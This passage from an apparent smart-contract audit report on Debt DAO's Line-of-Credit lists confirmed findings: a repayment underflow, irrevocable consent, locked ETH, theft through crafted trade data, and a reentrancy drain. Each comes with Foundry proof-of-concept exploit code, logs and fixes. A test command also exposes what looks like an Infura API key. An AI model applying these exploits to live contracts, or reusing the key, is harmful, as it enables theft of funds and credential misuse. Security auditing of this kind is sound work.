1` will make it hugely expensive to repay the credit line.\n\n### Proof of Concept\n\n[utils/CreditLib.sol#L186](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186)\n\n```solidity\nfunction repay(\n  ILineOfCredit.Credit memory credit,\n  bytes32 id,\n  uint256 amount\n)\n  external\n  returns (ILineOfCredit.Credit memory)\n{ unchecked {\n    if (amount <= credit.interestAccrued) {\n        credit.interestAccrued -= amount;\n        credit.interestRepaid += amount;\n        emit RepayInterest(id, amount);\n        return credit;\n    } else {\n        uint256 interest = credit.interestAccrued;\n        uint256 principalPayment = amount - interest;\n\n        // update individual credit line denominated in token\n        credit.principal -= principalPayment; // @audit-info potential underflow without an error due to the unchecked block\n        credit.interestRepaid += interest;\n        credit.interestAccrued = 0;\n\n        emit RepayInterest(id, interest);\n        emit RepayPrincipal(id, principalPayment);\n\n        return credit;\n    }\n} }\n```\n\nTo demonstrate the issue, copy the following test case and paste it into the `SpigotedLine.t.sol` test file. Then run `forge test --match-test \"test_lender_use_and_repay_underflow\"`.\n\nFollowing scenario causes the repayment to underflow:\n\n1.  Borrower borrows `1 ether` of `revenueToken`\n2.  `2 ether` worth of `revenueToken` is claimed and traded from the revenue contract\n3.  Use all of the previously claimed funds (`2 ether`) to repay the line of credit (= `1 ether`)\n4.  `credit.principal` underflows due to `principalPayment` is larger than `credit.principal`\n\n```solidity\nfunction test_lender_use_and_repay_underflow() public {\n    uint256 largeRevenueAmount = lentAmount * 2;\n\n    deal(address(lender), lentAmount + 1 ether);\n    deal(address(revenueToken), MAX_REVENUE);\n    address revenueC = address(0xbeef); // need new spigot for testing\n    bytes32 id = _createCredit(address(revenueToken), Denominations.ETH, revenueC);\n\n    // 1. Borrow lentAmount = 1 ether\n    _borrow(id, lentAmount);\n\n    // 2. Claim and trade largeRevenueAmount = 2 ether (revenue)\n    bytes memory tradeData = abi.encodeWithSignature(\n      'trade(address,address,uint256,uint256)',\n      address(revenueToken),\n      Denominations.ETH,\n      1 gwei,\n      largeRevenueAmount\n    );\n\n    hoax(borrower);\n    line.claimAndTrade(address(revenueToken), tradeData);\n\n    (, uint256 principalBeforeRepaying,,,,,) = line.credits(line.ids(0));\n    assertEq(principalBeforeRepaying, lentAmount);\n\n    // 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)\n    vm.prank(lender);\n    line.useAndRepay(largeRevenueAmount);\n    (, uint256 _principal,,,,,) = line.credits(line.ids(0));\n\n    uint256 underflowedPrincipal = principalBeforeRepaying;\n\n    unchecked {\n      underflowedPrincipal -= (largeRevenueAmount);\n    }\n\n    // 4. Principal underflowed\n    assertEq(_principal, underflowedPrincipal);\n  }\n```\n\n### Recommended Mitigation Steps\n\nConsider asserting `amount` is less or equal than `credit.principal + credit.interestAccrued` (`require(amount <= credit.principal + credit.interestAccrued);`). Similar as how it is done in [`LineOfCredit.depositAndRepay()`](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326)\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/461)**\n\n\n***\n\n \n# Medium Risk Findings (11)\n## [[M-01] Borrower can by mistake add own money to credit if credit is in ETH](https://github.com/code-423n4/2022-11-debtdao-findings/issues/24)\n*Submitted by [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/24)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74>\n\n### Impact\n\nBorrower can mistakenly add own money to credit if credit is in ETH.\n\n### Proof of Concept\n\nFunction `LineOfCredit.addCredit` is used to create new credit.\n\nIt can be called only after contest of another party.\n\n```solidity\n    function addCredit(\n        uint128 drate,\n        uint128 frate,\n        uint256 amount,\n        address token,\n        address lender\n    )\n        external\n        payable\n        override\n        whileActive\n        mutualConsent(lender, borrower)\n        returns (bytes32)\n    {\n        LineLib.receiveTokenOrETH(token, lender, amount);\n\n\n        bytes32 id = _createCredit(lender, token, amount);\n\n\n        require(interestRate.setRate(id, drate, frate));\n        \n        return id;\n    }\n```\n\n`LineLib.receiveTokenOrETH(token, lender, amount)` is responsible for getting payment.\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74>\n\n```solidity\n    function receiveTokenOrETH(\n      address token,\n      address sender,\n      uint256 amount\n    )\n      external\n      returns (bool)\n    {\n        if(token == address(0)) { revert TransferFailed(); }\n        if(token != Denominations.ETH) { // ERC20\n            IERC20(token).safeTransferFrom(sender, address(this), amount);\n        } else { // ETH\n            if(msg.value < amount) { revert TransferFailed(); }\n        }\n        return true;\n    }\n```\n\nAs you can see in case of native token payment, `sender` is not checked to be `msg.sender`, so this makes it's possible that borrower can mistakenly pay instead of lender. It sounds funny, but it's possible. What is needed is for the lender to call `addCredit` first and then borrower calls `addCredit` and provides value.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nCheck that if payment in ETH, then `lender == msg.sender` in `addCredit` function.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/24)**\n\n***\n\n## [[M-02] Mutual consent cannot be revoked and stays valid forever](https://github.com/code-423n4/2022-11-debtdao-findings/issues/33)\n*Submitted by [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/33), also found by [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/526), [SmartSek](https://github.com/code-423n4/2022-11-debtdao-findings/issues/503), [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/299), [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/271), [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/61), and [HE1M](https://github.com/code-423n4/2022-11-debtdao-findings/issues/38)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L11-L68>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262>\n\n### Impact\n\nContracts that inherit from the `MutualConsent` contract, have access to a `mutualConsent` modifier.\n\nFunctions that use this modifier need consent from two parties to be called successfully.\n\nOnce one party has given consent for a function call, it cannot revoke consent.\n\nThis means that the other party can call this function at any time now.\n\nThis opens the door for several exploitation paths.\n\nMost notably though the functions `LineOfCredit.setRates()`, `LineOfCredit.addCredit()` and `LineOfCredit.increaseCredit()` can cause problems.\n\nOne party can use Social Engineering to make the other party consent to multiple function calls and exploit the multiple consents.\n\n### Proof of Concept\n\n1.  A borrower and lender want to change the rates for a credit.\n    The borrower wants to create the possibility for himself to change the rates in the future without the lender's consent.\n2.  The borrower and lender agree to set `dRate` and `fRate` to 5%.\n3.  The lender calls the `LineOfCredit.setRates()` function to give his consent.\n4.  The borrower might now say to the lender \"Let's put the rate to 5.1% instead, I will give an extra 0.1%\"\n5.  The borrower and lender now both call the `LineOfCredit.setRates()` function to set the rates to 5.1%.\n6.  The borrower can now set the rates to 5% at any time. E.g. they might increase the rates further in the future (the borrower playing by the rules) and at some point the borrower can decide to set the rates to 5%.\n\nLinks:\n\n`MutualConsent` contract: <https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol>\n\n`LineOfCredit.setRates()` function: <https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262>\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThere are several options to fix this issue:\n\n1.  Add a function to the `MutualConsent` contract to revoke consent for a function call.\n2.  Make consent valid only for a certain amount of time.\n3.  Invalidate existing consents for a function when function is called with different arguments.\n\nOption 3 requires a lot of additional bookkeeping but is probably the cleanest solution.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/33)**\n\n***\n\n## [[M-03] Borrower/Lender excessive ETH not refunded and permanently locked in protocol](https://github.com/code-423n4/2022-11-debtdao-findings/issues/39)\n*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/39), also found by [brgltd](https://github.com/code-423n4/2022-11-debtdao-findings/issues/528), [HE1M](https://github.com/code-423n4/2022-11-debtdao-findings/issues/523), [eierina](https://github.com/code-423n4/2022-11-debtdao-findings/issues/522), [d3e4](https://github.com/code-423n4/2022-11-debtdao-findings/issues/497), [lotux](https://github.com/code-423n4/2022-11-debtdao-findings/issues/466), [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/463), [RedOneN](https://github.com/code-423n4/2022-11-debtdao-findings/issues/459), [joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/444), [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/431), [rbserver](https://github.com/code-423n4/2022-11-debtdao-findings/issues/410), [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/364), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/342), [Ch\\_301](https://github.com/code-423n4/2022-11-debtdao-findings/issues/318), [immeas](https://github.com/code-423n4/2022-11-debtdao-findings/issues/307), [cccz](https://github.com/code-423n4/2022-11-debtdao-findings/issues/290), [Tomo](https://github.com/code-423n4/2022-11-debtdao-findings/issues/253), [ayeslick](https://github.com/code-423n4/2022-11-debtdao-findings/issues/213), [codexploder](https://github.com/code-423n4/2022-11-debtdao-findings/issues/194), [eighty](https://github.com/code-423n4/2022-11-debtdao-findings/issues/182), [Ruhum](https://github.com/code-423n4/2022-11-debtdao-findings/issues/181), [carlitox477](https://github.com/code-423n4/2022-11-debtdao-findings/issues/175), [perseverancesuccess](https://github.com/code-423n4/2022-11-debtdao-findings/issues/162), [Lambda](https://github.com/code-423n4/2022-11-debtdao-findings/issues/124), [8olidity](https://github.com/code-423n4/2022-11-debtdao-findings/issues/94), [Koolex](https://github.com/code-423n4/2022-11-debtdao-findings/issues/84), [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/81), [Nyx](https://github.com/code-423n4/2022-11-debtdao-findings/issues/56), and [rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/25)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L292>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L265>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L71>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388>\n\n### Impact\n\nThe protocol does not refund overpayment of ETH. Excessive ETH is not included in the protocols accounting. As a result, the funds are permanently locked in the protocol **(Loss of funds)**.\n\nThere are multiple scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol.\n\nThe vulnerability effects at least five different scenarios and locks both the lender and borrowers ETH in LineOfCredit if overpaid. **There is no way to transfer the locked ETH back to the users**, as the withdraw methods are dependent on accounting (which is not updated with locked ETH).\n\nThis vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine.\n\n### Proof of Concept\n\nThe bug resides in `receiveTokenOrETH` function when receiving ETH.\n\nThe function does not handle cases where `msg.value` is larger than `amount` meaning a refund is needed (`msg.value` - `amount`). In such cases, `msg.value` is added to the balance of LineOfCredit although only `amount` is used in internal accounting. Thus the excessive ETH  is permanently locked in the contract as the withdraw methods are dependent on the internal accounting.\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59>\n\n      function receiveTokenOrETH(\n          address token,\n          address sender,\n          uint256 amount\n        )\n          external\n          returns (bool)\n        {\n            if(token == address(0)) { revert TransferFailed(); }\n            if(token != Denominations.ETH) { // ERC20\n                IERC20(token).safeTransferFrom(sender, address(this), amount);\n            } else { // ETH\n                if(msg.value < amount) { revert TransferFailed(); }\n            }\n            return true;\n        }\n\nScenarios where borrowers ETH funds will be locked in LineOfCredit:\n\n1.  Borrower calls `depositAndClose` with an ETH value that is above the owed debt.\n2.  Borrower calls `depositAndRepay` with an ETH value that is above the amount specified in the parameters.\n3.  Borrower calls `close` with an ETH value that is above the owed fees.\n\nScenarios where lenders ETH funds will be locked in LineOfCredit:\n\n1.  Lender calls `addCredit` with and ETH value that is greater than the `amount` parameter.\n2.  Lender calls `increaseCredit` with and ETH value that is greater than the `amount` parameter.\n\nThe above scenarios will happen when:\n\n*   Excessive ETH is sent with the confidence that it will be refunded (expected). Intentionally or by mistake.\n*   Excessive ETH will be sent (and expected to be refunded) when calling `depositeAndClose()`, `close(id)` and `depositAndRepay(amount)` as they internally update the fees with the `_accrue` method. The amount changes every second because part of the formula that calculates the fees is based on a multiplication of seconds past the previous calculations. In most cases, the caller will not know the amount of interest that will be accrued and must send excessive ETH to not revert the transaction.\n    *   The formula that calculates interest:\n\n`InterestAccrued = (rate.dRate * drawnBalance * timespan) / INTEREST_DENOMINATOR + \n(rate.fRate * (facilityBalance - drawnBalance) * timespan) / INTEREST_DENOMINATOR`<br>\nWhere `timespan` is `timespan= block.timestamp - rate.lastAccrued`<br>\n    *   Attached link to Debt DAO docs with more information: <https://docs.debtdao.finance/faq/accrued-interest-calculation>\n\nThe POC includes four of the mentioned scenarios. To run the POC add the below code to the LineOfCredit.t.sol test and execute `forge test -v`. Expected output:\n\n    Running 4 tests for contracts/tests/LineOfCredit.t.sol:LineTest\n    [PASS] test_freeze_eth_addCredit() (gas: 277920)\n    [PASS] test_freeze_eth_depositAndClose() (gas: 280378)\n    [PASS] test_freeze_eth_depositAndRepay() (gas: 302991)\n    [PASS] test_freeze_eth_increaseCredit() (gas: 318830)\n    Test result: ok. 4 passed; 0 failed; finished in 1.59ms\n\nAdd the following code to tests:\n\n        function _addCreditEth(address token, uint256 amount) internal {\n            vm.prank(borrower);\n            line.addCredit(dRate, fRate, amount, token, lender);\n            vm.stopPrank();\n            vm.prank(lender);\n            line.addCredit{value: amount}(dRate, fRate, amount, token, lender);\n            vm.stopPrank();\n        }\n        function test_freeze_eth_depositAndClose() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            _addCreditEth(eth, amount);\n\n            //borrow 1 ether\n            bytes32 id = line.ids(0);\n            vm.startPrank(borrower);\n            line.borrow(id, amount);\n            vm.stopPrank();\n            \n            //depositAndClose full extra funds (amount * 2)\n            vm.startPrank(borrower);\n            line.depositAndClose{value:amount*2}();\n            vm.stopPrank();\n\n            //validate funds are stuck\n            console.log(address(line).balance);\n            assert(address(line).balance == amount*2 - amount);\n        }\n\n         function test_freeze_eth_depositAndRepay() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            _addCreditEth(eth, amount);\n\n            //borrow 1 ether\n            bytes32 id = line.ids(0);\n            vm.startPrank(borrower);\n            line.borrow(id, amount);\n            vm.stopPrank();\n            \n            //depositAndRepay full extra funds (amount * 2)\n            vm.startPrank(borrower);\n            line.depositAndRepay{value:amount*2}(amount);\n            vm.stopPrank();\n\n\n            // Lender calls withdraw \n            vm.startPrank(lender);\n            line.withdraw(id, amount);\n            vm.stopPrank();\n\n            //validate funds are stuck\n            assert(address(line).balance == amount*2 - amount);\n        }\n\n        function test_freeze_eth_addCredit() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            vm.prank(borrower);\n            line.addCredit(dRate, fRate, amount, eth, lender);\n            vm.stopPrank();\n            vm.prank(lender);\n            //double msg.value then amount\n            line.addCredit{value: amount*2}(dRate, fRate, amount, eth, lender);\n            vm.stopPrank();\n\n            //borrow 1 ether\n            bytes32 id = line.ids(0);\n            vm.startPrank(borrower);\n            line.borrow(id, amount);\n            vm.stopPrank();\n            \n            //depositAndClose full extra funds (amount)\n            vm.startPrank(borrower);\n            line.depositAndClose{value:amount}();\n            vm.stopPrank();\n\n            //validate funds are stuck\n            assert(address(line).balance == amount*2 - amount);\n        }\n\n        function test_freeze_eth_increaseCredit() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            _addCreditEth(eth, amount);\n            \n            // get id\n            bytes32 id = line.ids(0);\n\n            // increase credit to line\n            vm.prank(borrower);\n            line.increaseCredit(id, amount);\n            vm.stopPrank();\n            vm.prank(lender);\n            //double msg.value then amount\n            line.increaseCredit{value:amount*2}(id, amount);\n            vm.stopPrank();\n\n            //total amount * 3 in contract\n\n            //borrow 2 ether\n            vm.startPrank(borrower);\n            line.borrow(id, amount * 2);\n            vm.stopPrank();\n            \n            //depositAndClose full extra funds (amount)\n            vm.startPrank(borrower);\n            line.depositAndClose{value:amount*2}();\n            vm.stopPrank();\n\n            //validate funds are stuck\n            assert(address(line).balance == amount*3 - amount*2);\n        }\n\nThe POC demonstrates how Borrower and Lender funds get locked in the protocol.\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\nOptions:\n\n1.  refund - in receiveTokenOrETH, refund tokens back to ` msg.sender  `if `msg.value > amount`\n2.  revert - change the expression `if(msg.value < amount)` to `if(msg.value != amount)` and revert the transaction.\n\n**[dmvt (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/39#issuecomment-1339519753):**\n > This has been rated Medium because it requires that the borrower or lender send too much ETH in the first place (external factor). Great report quality!\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/39#issuecomment-1405075453)**\n\n\n\n***\n\n## [[M-04] Lender can trade claimToken in a malicious way to steal the borrower's money via `claimAndRepay()` in SpigotedLine by using malicious zeroExTradeData](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110)\n*Submitted by [perseverancesuccess](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110), also found by [Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/411), [HE1M](https://github.com/code-423n4/2022-11-debtdao-findings/issues/384), [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/363), [adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/349), [cccz](https://github.com/code-423n4/2022-11-debtdao-findings/issues/274), [0x52](https://github.com/code-423n4/2022-11-debtdao-findings/issues/153), [Lambda](https://github.com/code-423n4/2022-11-debtdao-findings/issues/126), and [aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/88)*\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85>\n\n### Impact\n\nLender can trade claimToken in a malicious way to steal the borrower's money via `claimAndRepay()` in SpigotedLine by using malicious zeroExTradeData.\n\nIn the design of the protocol, the lender can use the function `claimAndRepay()`, the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit.\n\n```\nfunction claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external\n        whileBorrowing\n        nonReentrant\n        returns (uint256) { \n\n...\n// Line 106 - Line 112\nuint256 newTokens = claimToken == credit.token ?\n          spigot.claimEscrow(claimToken) :  // same asset. dont trade\n          _claimAndTrade(                   // trade revenue token for debt obligation\n              claimToken,\n              credit.token,\n              zeroExTradeData\n          );\n...\n// Line 128 - Line 130 \n credits[id] = _repay(credit, id, repaid);\n\n        emit RevenuePayment(claimToken, repaid);\n\n...\n\n}\n\n```\n\n    function _claimAndTrade(\n          address claimToken,\n          address targetToken,\n          bytes calldata zeroExTradeData\n        )\n            internal\n            returns (uint256)\n        {\n            (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(\n                claimToken,\n                targetToken,\n                swapTarget,\n                address(spigot),\n                unusedTokens[claimToken],\n                zeroExTradeData\n            );\n\n            // we dont use revenue after this so can store now\n            unusedTokens[claimToken] = totalUnused;\n            return tokensBought;\n        }\n\n```\nfunction claimAndTrade(\n        address claimToken,\n        address targetToken,\n        address payable swapTarget,\n        address spigot,\n        uint256 unused,\n        bytes calldata zeroExTradeData\n    )\n    external \n        returns(uint256, uint256)\n\n{\n...\n trade(\n            claimed + unused,\n            claimToken,\n            swapTarget,\n            zeroExTradeData\n        );\n        \n        // underflow revert ensures we have more tokens than we started with\n        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;\n\n        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n...\n\n\n}\n\n```\n\nIn the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert.\n\nThe bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.\n\n### Proof of Concept\n\nThe following code can manipulate and bypass the check to steal money of the borrower.\n\nStep 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract.\n\nStep 2: In the exploit contract, have the `receive()` function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit.\n\n```\nreceive() external payable {\n    console.log(\"Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\");\n    uint256 amount = 100; \n    creditToken.transfer(address(line),amount);\n    console.log(\"Receive the amount of ETH: %s\", msg.value);\n  }\n\n```\n\nIn the `receive()` function, the exploit contract transfers some amount of creditToken to the SpigotedLine contract to bypass the check:\n\n     if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n\nSince this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken.\n\nThis amount then will be used to repay the credit.\n\nSo this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.\n\nIn the zip file in the Google_Drive link, there is the POC written for this bug.\n\nThe test case is test_lender_can_claim_and_repay\\_3 in file SpigotedLine.t.modified.sol\n\nYou can put this file to the tests folder\n<https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing>\n\nYou can run the POC by calling:\n\n    forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\n    umber 15918000\n\nHere I use the block-number to make the test log stable, but this does not impact the logic of POC.\n\nYou can find the detailed log file: Line-of-Credit\\test_claim\\_221107\\_2311.log.\n\nThe full log file here: <https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing>\n\nIn this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 &ast; ( 10 &ast;&ast; -18 ) BUSD for the borrower.\n\nLogs:\n\nStep 0: As a Borrower borrow some money\n\nStep 1: Construct the tradeData to call claimAndRepay as the lender\nclaimed: 1000000000000000000000\n\nunused: 0\n\nsellAmount: 1000000000000000000000\n\nStep 1: As the lender, call claimAndRepay with Malicious zeroExTradeData\n\nCallback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\n\nReceive the amount of ETH: 632428006785336734\nemit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)\n\nemit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)\n\nRevenuePayment(token: DAI: \\[0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)\n\nYou can use the POC.patch here: <https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing>\n\nTo use it use command\n\n```\ngit apply POC.patch\n\n```\n\nTo run use command\n\n```\nforge install\nforge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\number 15918000\n\n```\n\nThe full code repository: <https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nThis is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.\n\n**[dmvt (judge) decreased severity to Medium](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110)**\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110#issuecomment-1343293968):**\n > A note on this. [#411](https://github.com/code-423n4/2022-11-debtdao-findings/issues/411) describes a different vector of the same fundamental attack. It's likely that the vector in #411 is more likely to occur, but I'm marking this one the best due to the inclusion of a test and descriptive POC. For the final report it should be noted that both the lender and borrower can perform a version of this attack.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110#issuecomment-1405075073)**\n\n\n\n***\n\n## [[M-05] Reentrancy bug allows lender to steal other lenders funds](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160)\n*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160), also found by [SmartSek](https://github.com/code-423n4/2022-11-debtdao-findings/issues/498), [joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/451), and [hansfriese](https://github.com/code-423n4/2022-11-debtdao-findings/issues/297)*\n\nA reentrancy bug in `LineOfCredit.sol` allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds).\n\nThe  reentrancy occurs in the `_close(credit, id)` function in `LineOfCredit.sol`. The `credit[id]` state variable is cleared only after sendings tokens to the lender.\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483>\n\n        function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n            if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n            // return the Lender's funds that are being repaid\n            if (credit.deposit + credit.interestRepaid > 0) {\n                LineLib.sendOutTokenOrETH(\n                    credit.token,\n                    credit.lender,\n                    credit.deposit + credit.interestRepaid\n                );\n            }\n\n            delete credits[id]; // gas refunds\n\n            // remove from active list\n            ids.removePosition(id);\n            unchecked { --count; }\n\n            // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n            if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n            emit CloseCreditPosition(id);\n\n            return true;\n        }\n\n### Proof of Concept\n\nReentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions.\nExample of a real-world popular token that can change control flow is PNT (pNetwork).\n\nAs the protocol supports any token listed on the oracle, if the oracle currently supports (or will support in the future) a feed of the above tokens, the bug is exploitable.\n\nIf a reentrancy occurs in the `_close(credit, id)` function, the `credit[id]` state variable is cleared only after sendings tokens to the lender.\nA lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`. A lender can repeat these processes as long as LineOfCredit has funds available.\n\nThe POC will demonstrate the following flow:\n\n1.  Borrower  adds a new credit with lender1 on 1000 tokens.\n2.  Borrower lends 1000 from lender1\n3.  Borrower repays debt\n4.  Borrower adds a new credit with lender2 on 1000 tokens\n5.  Borrower closes debt with lender1\n6.  Lender1 receives 2000 tokens.\n\nAdd the `MockLender.sol` to mock folder.\n\n    pragma solidity 0.8.9;\n\n    import { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\n    import { Token777 } from \"./Token777.sol\";\n\n    contract MockLender {\n        address owner;\n        ILineOfCredit line;\n        bytes32 id;\n        bool lock;\n        \n        event GotMoney(uint256 amount);\n\n        constructor(address _line) public {\n            line = ILineOfCredit(_line);\n            owner = msg.sender;\n        }\n\n        function addCredit(\n            uint128 drate,\n            uint128 frate,\n            uint256 amount,\n            address token\n        ) external {\n            require(msg.sender == owner, \"Only callable by owner\");\n            Token777(token).approve(address(line), amount);\n            Token777(token).approve(address(owner), type(uint256).max);\n            Token777(token).mockAddToRegistry();\n            id = 